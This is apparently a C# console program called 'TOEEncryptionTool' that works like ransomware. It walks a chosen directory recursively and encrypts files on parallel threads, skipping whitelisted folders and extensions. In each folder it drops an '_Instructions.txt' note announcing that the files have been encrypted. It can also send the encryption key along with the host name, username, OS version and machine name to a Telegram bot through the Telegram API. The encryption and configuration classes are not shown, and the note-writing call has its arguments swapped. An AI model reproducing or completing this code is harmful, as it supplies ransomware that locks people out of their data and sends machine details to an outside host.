using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

/*TODO:
 * 1. make some parts of the telegram message spoilered
 * 2. make the program more user friendly
 */

namespace TOEEncryptionTool
{
    internal static class Logger
    {
        internal static void LogError(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[!] " + message);
            Console.ResetColor();
        }
        internal static void Info(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[i] " + message);
            Console.ResetColor();
        }

        internal static void skipFldr(string message)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[i] " + message);
            Console.ResetColor();
        }
    }

    internal class Program
    {
        static void Main()
        {
            string dir = ValidateDirectory();
            Console.WriteLine("Directory to be encrypted: " + dir);
            
            Console.WriteLine("Enter the key you want to encrypt with:");
            string key = GetKey();
            Config.SetKey(key);

            Console.WriteLine("Do you wish to send this key to a telegram bot? (Y/N)");
            string choice = Console.ReadLine();

            if (choice == "Y".ToLower())
            {
                Console.WriteLine("!IMPORTANT!");
                Console.WriteLine("What is your ChatID?");
                string chatID = GetID();
                Config.SetID(chatID);
                Console.WriteLine("What is your Bot Token?");
                string token = GetToken();
                Config.SetToken(token);

                Console.WriteLine("Press any key to send the key to the bot.");
                Console.ReadKey();

                List<string> keyInfo = new List<string>
                {
                    "- - - - - - Decryption Information - - - - - -",
                    $"Key: {Config.Key}",
                    $"Token: {Config.Token}",
                    $"ChatID: {Config.ChatID}",
                    "",
                    "- - - - - - User Information - - - - - - ",
                    $"Host Name: {Dns.GetHostName()}",
                    $"Username: {Environment.UserName}",
                    "",
                    "- - - - - - Machine Information - - - - - - ",
                    $"Operating System: {Environment.OSVersion}",
                    $"Machine Name: {Environment.MachineName}",
                    $"System Directory: {Environment.SystemDirectory}",
                    "",
                    $"- - - - - - Other Information - - - - - -",
                    $"Directory: {dir}"

                };
                try
                {
                    string m = string.Join("\n", keyInfo);
                    Send(m);
                    Logger.Info($"Sent Information to {token} with ChatID {chatID}");
                }
                catch (Exception e)
                {
                    Logger.LogError("Could not send message: " + e.Message);
                }
            }
            else
            {
                Console.WriteLine("It is not advised to store the key locally!");
                Console.WriteLine("Don't lose it!");
                Console.ReadKey();
            }
            Logger.Info("Encryption starting...\nPress any key to continue...");
            Console.ReadKey();
            Thread.Sleep(1500);
            Stopwatch sw = new Stopwatch();

            sw.Start();
            EncDir(dir);
            sw.Stop();
            int time = sw.Elapsed.Milliseconds;
            Logger.Info($"Encryption time: {time}ms");
            Console.WriteLine("Press any key to continue...");
            Console.ReadKey();
        }

        internal static string ValidateDirectory()
        {
            string dir;
            bool isValid = false;

            do
            {
                Console.WriteLine("Enter the directory you want to encrypt: ");
                dir = Console.ReadLine();
                Console.WriteLine($"Checking if {dir} is valid...");
                Thread.Sleep(1500);
                isValid = ValidDir(dir);

                if (!isValid)
                {
                    Console.WriteLine($"Directory: {dir} is not valid!");
                }

            } while (!isValid);

            return dir;
        }

        internal static bool ValidDir(string path)
        {
            try
            {
                return !string.IsNullOrWhiteSpace(path) && Path.IsPathRooted(path) && !Path.GetInvalidPathChars().Any(c => path.Contains(c));
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static string GetID()
        {
            string chatID;
            do
            {
                Console.WriteLine("Enter your chat ID: ");
                chatID = Console.ReadLine();
                if (string.IsNullOrEmpty(chatID))
                {
                    Logger.LogError("Chat ID cannot be empty!");
                }
            } while (string.IsNullOrEmpty(chatID));
            
            return chatID;
        }

        private static string GetToken()
        {
            string token;

            do
            {
                Console.WriteLine("Enter your token: ");
                token = Console.ReadLine();
                if (token.Length > 46)
                {
                    Logger.LogError("Token is too large!");
                }

                
            } while (token.Length > 46);

            return token;
        }

        private static string GetKey()
        {
            string key;

            do
            {
                Console.WriteLine("Enter the key you want to encrypt with:");
                key = Console.ReadLine();
                if (key.Length != 32)
                {
                    Logger.LogError("Key must be 32 chars !");
                }
            } while (key.Length != 32);

            return key;
        }

        private static void DropNote(string dir)
        {
            try
            {
                string path = Path.Combine(dir, "_Instructions.txt");

                if (!File.Exists(path))
                {
                    File.WriteAllText("Your files have been encrypted by TOEEncryption tool, to decrypt your files\nRun the decryption tool with the key you used to encrypt the files\n\n", path);
                }
            }
            catch (Exception e)
            {
                Logger.LogError(e.Message);
            }
        }

        static void EncDir(string dir)
        {
            if (!IsFolderWhiteListed(dir))
            {
                DropNote(dir);

                try
                {
                    string[] files = Directory.GetFiles(dir);
                    List<string> subDirs = Directory.GetDirectories(dir).ToList();

                    Thread fileThread = new Thread(() =>
                    {
                        foreach (string file in files)
                        {
                            try
                            {
                                try
                                {
                                    FileInfo fileInfo = new FileInfo(file);
                                    fileInfo.Attributes = FileAttributes.Normal;
                                }

                                catch (Exception e)
                                {
                                    Logger.LogError($"Could not change file attributes: {e.ToString()}");
                                }

                                if (!IsFileWhiteListed(file))
                                {
                                    CryptIO.EncryptFile(file);
                                    Logger.Info("File Encrypted: " + file);
                                }

                                else
                                {
                                    Logger.skipFldr("Skipped file: " + file);
                                }
                            }

                            catch (Exception e)
                            {
                                Logger.LogError($"Could not process file: {file} - " + e.ToString());
                            }
                        }
                    });

                    Thread folderThread = new Thread(() =>
                    {
                        foreach (string subDir in subDirs)
                        {
                            if (!IsFolderWhiteListed(subDir))
                            {
                                DropNote(subDir);

                                try
                                {
                                    DirectoryInfo dirInfo = new DirectoryInfo(subDir);
                                    dirInfo.Attributes = FileAttributes.Normal;
                                }

                                catch (Exception e)
                                {
                                    Logger.LogError("Could not set directory attributes: " + e.ToString());
                                }

                                EncDir(subDir);
                            }
                        }
                    });

                    fileThread.Start();
                    folderThread.Start();
                    fileThread.Join();
                    folderThread.Join();
                }
                catch
                { }
            }

            else
            {
                Logger.skipFldr("Skipped folder: " + dir);
            }
        }

        internal static bool IsFolderWhiteListed(string path)
        {
            foreach (string whitefldr in Config.WhiteFldrs)
            {
                if (path.Contains(whitefldr))
                {
                    return true;
                }
            }

            return false;
        }


        internal static bool IsFileWhiteListed(string path)
        {
            foreach (string whiteExt in Config.WhiteExts)
            {
                if (path.ToLower().Contains(whiteExt.ToLower()))
                {
                    return true;
                }
            }

            return false;
        }

        internal static void Send(string msg)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            string botToken = Config.Token;
            string chatId = Config.ChatID;
            string url = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={msg}";

            try
            {
                using (WebClient client = new WebClient())
                {
                    string res = client.DownloadString(url);
                }
            }

            catch (Exception e)
            {
                Console.WriteLine(
                    "[!] Error: " +
                    e +
                    "\r\n\r\n[-] Failed Url: " +
                    url +
                    "\r\n\r\n"
                );
            }
        }
    }
}
